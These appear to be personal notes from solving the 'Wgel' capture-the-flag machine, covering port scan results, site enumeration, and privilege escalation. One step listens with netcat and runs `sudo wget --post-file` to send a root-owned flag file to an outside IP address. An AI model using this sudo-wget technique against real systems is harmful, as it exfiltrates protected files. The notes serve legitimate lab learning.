## Wgel

# nmap
22 OpenSSH 7.2p2
80 Apache httpd 2.4.18

# creds

Jessie

# enumerate sitemap
.ssh dir for the jessie user

`sudo -l` gives a overview of privaledges

`wget` has a feature that it can send files `--post-file` if wget can be run as root the following works:
first listen on nc `nc -l 9999`
`sudo wget --post-file=/root/root_flag.txt 10.9.9.193:9999`

# Lessons learned

`wget` can send files
`sudo -l` gives usefull information
site enumeration is key
always view source, even on 'It works' pages from apache
dirbuster cant do suburls gobuster can
